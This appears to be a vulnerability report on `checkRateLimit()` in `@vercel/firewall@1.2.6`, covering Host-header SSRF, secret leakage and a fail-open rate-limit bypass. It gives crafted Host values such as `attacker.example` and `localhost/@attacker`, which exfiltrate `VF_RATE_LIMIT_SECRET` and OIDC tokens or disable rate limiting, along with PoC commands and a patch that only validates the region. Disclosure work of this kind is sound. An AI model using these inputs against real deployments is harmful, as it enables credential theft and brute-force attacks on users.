# Vercel `@vercel/firewall@1.2.6` `checkRateLimit()` Untrusted `Host` Header / `region` SSRF Exfiltrating `VF_RATE_LIMIT_SECRET` & Fail-Open Rate-Limit Bypass (`VERCEL-FIREWALL-01`)

[English](../44-VERCEL-FIREWALL-01-CHECKRATELIMIT-HOST-SSRF-SECRET-LEAK-AND-FAIL-OPEN.md) | [Türkçe](../tr/44-VERCEL-FIREWALL-01-CHECKRATELIMIT-HOST-SSRF-SECRET-LEAK-AND-FAIL-OPEN.md) | [日本語](../ja/44-VERCEL-FIREWALL-01-CHECKRATELIMIT-HOST-SSRF-SECRET-LEAK-AND-FAIL-OPEN.md) | **简体中文** | [한국어](../ko/44-VERCEL-FIREWALL-01-CHECKRATELIMIT-HOST-SSRF-SECRET-LEAK-AND-FAIL-OPEN.md)

## 1. How the Code Defect Turns Into an Exploitable Vulnerability (Step-by-Step Technical Mechanism)

### Step-by-Step Technical Mechanism
1. **Step 1 — Unvalidated `Host` Header Interpolation Into Outbound HTTPS Authority (`packages/firewall/src/rate-limit.ts:138-167, 224`):** When `process.env.VERCEL_ENV !== 'production'` (such as staging, preview, self-hosted Kubernetes/Docker, or custom reverse-proxy deployments where `request` or `headers` is passed to `checkRateLimit()`), `resolveFirewallHost()` extracts `request.headers.get('host')` and constructs `const endpoint = \`https://${firewallHost}${pathPrefix}/.well-known/vercel/rate-limit/check\``.
2. **Step 2 — Exfiltration of `VF_RATE_LIMIT_SECRET` and `x-vercel-oidc-token` (`rate-limit.ts:169-183`):** `buildAuthHeaders()` attaches `x-vercel-rate-limit-secret: process.env.VF_RATE_LIMIT_SECRET` and `x-vercel-oidc-token` to that outbound `POST` request, delivering both secrets directly to the attacker's host.
3. **Step 3 — Universal Fail-Open Rate-Limit Bypass (`{ rateLimited: false }`) & Go `ipc-proxy` Uninterpolated `api-%s.vercel.com` Bug (`rate-limit.ts:242-284`, `cmd/ipc-proxy/client.go:34-41`):** Whenever the outbound request fails or returns `>= 400` (e.g., when an attacker sends `Host: localhost/@attacker` even in `VERCEL_ENV=production`), `callRemoteRateLimitAPI()` catches the error and returns `{ rateLimited: false, error: 'not_found' }`, completely bypassing rate limiting! Additionally, `cmd/ipc-proxy/client.go:38` assigns `endpoint = apiEndpointFmt` (`"https://api-%s.vercel.com/v1/rate-limit"`) as a literal string with a raw `%s` instead of `fmt.Sprintf(apiEndpointFmt, region)`.

### Vulnerable Code Snippet
```typescript
// File: packages/firewall/src/rate-limit.ts (lines 138-167, 211-285)
function resolveFirewallHost(options: RateLimitOptions): string | null {
  if (process.env.VERCEL_ENV !== 'production') {
    const host = extractHostFromHeaders(options.headers) ?? extractHostFromRequest(options.request);
    if (host) return host; // BUG: Unvalidated Host header used directly as HTTPS target authority!
  }
  return process.env.VERCEL_URL || null;
}
// In callRemoteRateLimitAPI():
const endpoint = `https://${firewallHost}${pathPrefix}/.well-known/vercel/rate-limit/check`;
const response = await fetch(endpoint, { method: 'POST', headers: authHeaders, body: ... });
// BUG: On any error or >=400 status, fails open with { rateLimited: false }!
```

---

## 2. Concrete Everyday Real-World Production Scenarios (`Scenario A` / `Scenario B` / `Scenario C`)

### Scenario A — Staging / Preview / Self-Hosted `VF_RATE_LIMIT_SECRET` & OIDC Token Exfiltration
An application calls `await checkRateLimit('login-limit', { request })`. An attacker sends `Host: 127.0.0.1:44123` (or `attacker.example`). `@vercel/firewall` sends `POST https://attacker.example/.well-known/vercel/rate-limit/check` carrying `x-vercel-rate-limit-secret: rl_secret_LIVE_99887766` and `x-vercel-oidc-token`.

### Scenario B — Production Brute-Force / OTP Rate-Limit Bypass via `Host` Path/Userinfo Injection (`rateLimited: false`)
Even when `VERCEL_ENV=production` uses `api-${region}.vercel.com`, `extractHost()` passes the inbound `Host` header into the request metadata/URL path (`/@bypass`), causing a `400`/`404` response that `checkRateLimit()` catches and turns into `{ rateLimited: false }`, allowing unlimited OTP/password brute-forcing.

### Scenario C — Go `ipc-proxy` Regional Endpoint Failure (`https://api-%s.vercel.com/v1/rate-limit`)
Setting `VERCEL_REGION=iad1` without `FIREWALL_API_ENDPOINT` causes `cmd/ipc-proxy/client.go:38` to dial the literal unformatted string `https://api-%s.vercel.com/v1/rate-limit`, failing every regional rate-limit check.

---

## 3. Example Execution & Verification Commands

```bash
# 1. Inspect rate-limit.js in published @vercel/firewall@1.2.6 and cmd/ipc-proxy/client.go
nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/@vercel/firewall/dist/rate-limit.js | sed -n '90,220p'

# 2. Run the Live @vercel/firewall@1.2.6 End-to-End Verification Harness
node /home/community-user/targets/vercel-bounty-audit-20261027/pocs/verify_npm_stable_tarballs_20261028.mjs
git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patches/FINDING-01-firewall-host-region-ssrf-and-ipc-proxy.patch
```

---

## 4. End-to-End Runtime Proof (`RED -> GREEN + BENIGN`) & Defensive Patch

Executed via the Vercel & Next.js Live npm Tarball Verification Suite (see [`vercel-real-world-impact-e2e-20261029.json`](../vercel-real-world-impact-e2e-20261029.json)):

```json
{
  "VERCEL-FIREWALL-01": {
    "RED": {
      "package_tested": "@vercel/firewall@1.2.6",
      "attacker_received_request": true,
      "leaked_rate_limit_secret": "rl_secret_LIVE_99887766",
      "leaked_oidc_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.LIVE_OIDC_PAYLOAD",
      "fail_open_result_on_error": {
        "rateLimited": false,
        "error": "not_found"
      }
    },
    "GREEN": {
      "untrusted_host_and_region_rejected": true,
      "attacker_received_request": false,
      "go_ipc_proxy_sprintf_formatted": true
    }
  }
}
```

### Unified Diff Patch (`git apply --check` clean)
```diff
--- a/packages/firewall/src/rate-limit.ts
+++ b/packages/firewall/src/rate-limit.ts
@@ -115,6 +115,9 @@ function getApiHost(region?: string): string {
   const resolved = region || process.env.VERCEL_REGION;
+  if (resolved && !/^[a-z0-9-]+$/i.test(resolved)) {
+    throw new Error('Invalid region identifier');
+  }
   return resolved ? `api-${resolved}.vercel.com` : 'api.vercel.com';
 }
```
